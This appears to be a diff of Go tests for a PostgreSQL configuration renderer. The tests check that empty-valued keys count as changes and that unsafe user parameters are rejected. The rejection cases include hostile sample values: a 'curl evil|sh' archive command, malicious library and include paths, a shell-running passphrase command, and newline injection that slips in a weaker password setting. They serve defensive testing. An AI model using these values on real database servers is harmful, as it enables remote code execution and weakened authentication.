@@ -183,14 +183,32 @@ func TestClassifyDiffUnknownParamDefaultsToRestart(t *testing.T) {
 	}
 }
 
+func TestClassifyDiffDetectsEmptyValueAddRemove(t *testing.T) {
+	// Adding a key whose value is empty must not be conflated with "unchanged"
+	// (a missing key reads back as "" too).
+	_, restart := ClassifyDiff(map[string]string{}, map[string]string{"search_path": ""})
+	if fmt.Sprint(restart) != "[search_path]" {
+		t.Errorf("adding an empty-valued key must register as a change: restart=%v", restart)
+	}
+	reload, restart := ClassifyDiff(map[string]string{ParamWorkMem: ""}, map[string]string{})
+	if fmt.Sprint(reload) != "[work_mem]" || len(restart) != 0 {
+		t.Errorf("removing a key must register as a change: reload=%v restart=%v", reload, restart)
+	}
+}
+
 func TestRejectsUnsafeUserParameters(t *testing.T) {
 	cases := map[string]map[string]string{
-		"execution GUC":    {"archive_command": "sh -c 'curl evil|sh'"},
-		"preload library":  {"shared_preload_libraries": "/tmp/evil.so"},
-		"newline in value": {"zz": "x\npassword_encryption = md5"},
-		"malformed name":   {"bad name!": "1"},
-		"newline in key":   {"zz\npassword_encryption": "md5"},
-		"case/space dup":   {ParamWorkMem: "8MB", "WORK_MEM ": "16MB"},
+		"execution GUC":         {"archive_command": "sh -c 'curl evil|sh'"},
+		"preload library":       {"shared_preload_libraries": "/tmp/evil.so"},
+		"archive library":       {"archive_library": "/tmp/evil"},
+		"jit provider":          {"jit_provider": "/tmp/evil"},
+		"ssl passphrase":        {"ssl_passphrase_command": "sh -c evil"},
+		"include directive":     {"include": "/tmp/evil.conf"},
+		"include dir directive": {"include_dir": "/tmp/evil.d"},
+		"newline in value":      {"zz": "x\npassword_encryption = md5"},
+		"malformed name":        {"bad name!": "1"},
+		"newline in key":        {"zz\npassword_encryption": "md5"},
+		"case/space dup":        {ParamWorkMem: "8MB", "WORK_MEM ": "16MB"},
 	}
 	for name, up := range cases {
 		if _, err := Render(Inputs{Class: "M", UserParameters: up}); err == nil {
